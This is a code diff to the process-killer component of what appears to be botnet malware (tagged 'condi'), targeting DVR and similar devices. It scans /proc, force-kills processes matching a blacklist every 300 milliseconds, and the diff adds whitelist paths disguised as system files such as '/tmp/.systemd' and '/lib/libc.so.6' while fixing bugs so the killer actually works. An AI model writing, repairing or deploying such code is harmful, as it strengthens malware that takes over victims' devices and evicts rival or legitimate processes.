@@ -71,7 +71,10 @@ const char *whitelisted[] = {
     "/root/dvr_gui/",
     "/root/dvr_app/",
     "/anko-app/",
-    "/opt/"
+    "/opt/",
+    "/usr/local/bin/apache2",
+    "/lib/libc.so.6",
+    "/tmp/.systemd",
 };
 
 const char *blacklisted[] = {
@@ -99,8 +102,6 @@ bool is_whitelisted(const char *path) {
 void killer_exe() {
     DIR *dir;
     struct dirent *entry;
-
-    // Get the PID of the current process
     pid_t current_pid = getpid();
 
     dir = opendir("/proc/");
@@ -111,7 +112,6 @@ void killer_exe() {
 
     while ((entry = readdir(dir))) {
         int pid = atoi(entry->d_name);
-        // Skip if pid is not valid or if it's the current process, parent process, or system processes
         if (pid <= 0 || pid == current_pid || pid == killer_pid || pid == getppid() || pid == 1)
             continue;
 
@@ -120,15 +120,14 @@ void killer_exe() {
 
         snprintf(proc_path, sizeof(proc_path), "/proc/%d/exe", pid);
         ssize_t len = readlink(proc_path, link_path, sizeof(link_path) - 1);
-        if (len == -1) {
-            continue; // Unable to read the link, skip to the next process
-        }
+        if (len == -1) continue;
 
         link_path[len] = '\0';
         if (is_whitelisted(link_path))
             continue;
 
-        for (int i = 0; blacklisted[i] != NULL; ++i) {
+        // CORRECCIÓN: usar tamaño del array en lugar de NULL
+        for (int i = 0; i < sizeof(blacklisted) / sizeof(blacklisted[0]); ++i) {
             if (strstr(link_path, blacklisted[i]) != NULL) {
                 char message[256];
                 snprintf(message, sizeof(message), "(condi/exe) Killed process: %s, PID: %d\n", link_path, pid);
@@ -136,84 +135,68 @@ void killer_exe() {
                     #ifdef DEBUG
                         printf("%s", message);
                     #endif
-                } else {
                 }
                 continue;
             }
         }
     }
-
     closedir(dir);
 }
-void killer_maps() /* finds and kills processes using /proc/pid/maps */
-{
+
+void killer_maps() {
     DIR *dir;
     struct dirent *file;
     char maps_path[BUFFER];
     char maps_line[BUFFER];
 
     dir = opendir("/proc/");
-    if (dir == NULL)
-        return;
+    if (dir == NULL) return;
 
-    while ((file = readdir(dir)) != NULL)
-    {
+    while ((file = readdir(dir)) != NULL) {
         int pid = atoi(file->d_name);
-        if (pid == killer_pid || pid == getppid() || pid == killer_pid || pid == 0 || pid == 1)
+        if (pid == killer_pid || pid == getppid() || pid == 0 || pid == 1)
             continue;
 
         snprintf(maps_path, BUFFER, "/proc/%d/maps", pid);
 
-        FILE *maps_file = fopen(maps_line, "r");
-        if (maps_file == NULL)
-            continue;
+        // CORRECCIÓN: usar maps_path, no maps_line
+        FILE *maps_file = fopen(maps_path, "r");
+        if (maps_file == NULL) continue;
 
-        while (fgets(maps_line, sizeof(maps_line), maps_file) != NULL)
-        {
+        while (fgets(maps_line, sizeof(maps_line), maps_file) != NULL) {
             char *pos = strchr(maps_line, ' ');
-            if (pos != NULL)
-                *pos = '\0';
+            if (pos != NULL) *pos = '\0';
 
-            if (is_whitelisted(maps_line))
-                continue;
+            if (is_whitelisted(maps_line)) continue;
 
-            for (int i = 0; i < sizeof(blacklisted) / sizeof(blacklisted[0]); ++i)
-            {
-                if (strstr(maps_line, blacklisted[i]) != NULL)
-                {
+            for (int i = 0; i < sizeof(blacklisted) / sizeof(blacklisted[0]); ++i) {
+                if (strstr(maps_line, blacklisted[i]) != NULL) {
                     char message[256];
                     snprintf(message, sizeof(message), "(condi/maps) Killed Process: %s, PID: %d\n", maps_line, pid);
-                    if (kill(pid, 9) == 0)
-                    {
+                    if (kill(pid, 9) == 0) {
                         #ifdef DEBUG
-                            printf(message);
+                            printf("%s", message);
                         #endif
-                        continue;
                     }
+                    continue;
                 }
             }
         }
-
         fclose(maps_file);
     }
-
     closedir(dir);
 }
 
 void killer_kill(void) {
-    stop_flag = 1; // using flag for stop killer
+    stop_flag = 1;
 }
 
-void killer_init(void) /* creates a child process, and indefinitely executes the killers every 300ms */
-{
-    int child;
-    child = fork();
-    if(child > 0 || child == 1)
-        return;
+void killer_init(void) {
+    int child = fork();
+    if (child > 0 || child == 1) return;
 
-    prctl(PR_SET_PDEATHSIG, SIGHUP); /* make sure all processes die */
-    while (1)
-    {
+    prctl(PR_SET_PDEATHSIG, SIGHUP);
+    while (1) {
         killer_exe();
         killer_maps();
         usleep(300000);
